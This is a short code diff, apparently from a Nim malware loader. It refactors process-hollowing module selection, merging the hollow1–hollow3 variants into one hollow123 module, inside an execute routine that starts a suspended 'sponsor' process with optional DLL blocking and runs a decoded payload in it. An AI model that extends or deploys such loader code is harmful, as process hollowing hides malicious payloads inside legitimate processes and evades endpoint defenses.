@@ -12,10 +12,8 @@ import supersnappy
 from std/base64 import decode
 
 # Import per module chosen
-when defined(hollow1):
-    import hollow1
-when defined(hollow2) or defined(hollow3):
-    import hollow23
+when defined(hollow1) or defined(hollow2) or defined(hollow3):
+    import hollow123
 when defined(hollow4) or defined(hollow5) or defined(hollow6):
     import hollow456
 
@@ -75,10 +73,8 @@ proc execute(payload: string, sponsorCmd: string = getAppFilename(), isBlockDlls
     var ppi: PPROCESS_INFORMATION = createSuspendedExtendedProcess(sponsorCmd, isBlockDlls)
 
     # Execute module
-    when defined(hollow1):
-        return hollow1(peStr, ppi)
-    when defined(hollow2) or defined(hollow3):
-        return hollow23(peStr, ppi)
+    when defined(hollow1) or defined(hollow2) or defined(hollow3):
+        return hollow123(peStr, ppi)
     when defined(hollow4) or defined(hollow5) or defined(hollow6):
         return hollow456Manager(peStr, ppi)
 
